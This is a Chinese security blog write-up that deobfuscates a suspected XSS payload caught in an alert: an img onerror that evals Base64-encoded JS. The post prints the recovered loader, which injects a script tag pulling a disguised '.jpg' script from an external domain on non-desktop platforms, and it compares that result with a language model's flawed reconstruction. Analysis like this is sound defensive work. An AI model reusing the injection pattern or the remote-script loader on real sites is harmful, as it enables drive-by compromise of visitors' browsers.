ailx10说：这篇是我2024年4月写的。onerror 里套着 atob，解出来又是一段混淆 JS，这种告警总让我忍不住想拆开看看。我先顺着 Base64 往里还原，再拿调试结果和大模型的解释对照，最后才看清它会按平台去加载一个带 jpg 后缀的外部脚本。原本像图片的名字，在代码里却扮演另一种角色，这也是这次最有意思的地方。文章保留了解码和辨认过程：不是看到 eval 就停下贴标签，而是继续问这段代码最终把浏览器带到了哪里。

---

最近告警分析，又遇到有趣的载荷了，疑似XSS注入，利用 onerror 事件，触发恶意JS方法，威胁载荷如下：

```
<img+src="image.gif"+onerror="eval(atob('ZXZhbChmdW5jdGlvbihwLGEsY......

```

对威胁载荷进行Base64解码，得到混淆的JS代码，如下图所示：

![](/notes-assets/003ac0b49f4eec50c5c0.webp)

对混淆的JS代码进行格式化，如下图所示：

![](/notes-assets/44e62bbf5fd71a2470fe.webp)

复制代码进IDE进行运行调试，还原部分代码如下图所示：

![](/notes-assets/36bb49a87a5ad7e9d553.webp)

对运行调试还原后的代码，进行JS格式化，如下图所示：

![](/notes-assets/5a38afe314622a16cd55.webp)

下面是运行调试中还原得到的JS代码：

```
var system = {

    win: false,

    mac: false,

    xll: false

};

var p = navigator.platform;

system.win = p.indexOf("Win") == 0;

system.mac = p.indexOf("Mac") == 0;

system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);

if (system.win || system.mac || system.xll) {} else {

    document.head.appendChild(document.createElement('script')).src = "https://img.maimn.net/upload/vod/20220914-1/8a128077011fed340196fd6ebd50a49d.jpg"

};

```

也可以通过大模型还原混淆代码，基本框架还原对了，但是细节有点问题，下面是大模型还原得到的JS代码：

```
var platformInfo = navigator.platform;



var isWindows = platformInfo.indexOf('Win') !== -1;

var isMacOS = platformInfo.indexOf('Mac') !== -1;

var isLinuxOrUnix = platformInfo.indexOf('X11') !== -1 || platformInfo.indexOf('Linux') !== -1;



if (!isWindows && !isMacOS && !isLinuxOrUnix) {

    var scriptElement = document.createElement('script');

    scriptElement.src = "r://k.j.m/q/o/n-1/l.c";

    document.head.appendChild(scriptElement);

}

```

这段代码判断系统类型，如果是Windows、Mac、Linux都不执行操作，否则，生成如下的\<script\>标签：

```
<script src="https://img.maimn.net/upload/vod/20220914-1/8a128077011fed340196fd6ebd50a49d.jpg"></script>

```

这个图片站点（`img.maimn.net`）现在暂时无法访问，不知道什么时候开放，想看看这个张图片

![](/notes-assets/666ccab8e30d27f4ad9e.webp)

这个域名 `maimn.net` ，在2023年06月26日注册，在2025年06月26日过期，子域名只有1个，那就是上面看到的 `img.maimn.net` ，整体分析下来，注入一个\<img\>标签，利用onerror事件执行一个JS方法，创建一个\<script\>标签，但是好像并没有看到实质性的攻击利用？

这次外部脚本没有取到，后续行为就还不能下结论。把已经还原的链路和仍缺的内容分开，既方便接着查，也能看出辅助工具在哪些地方帮了倒忙。
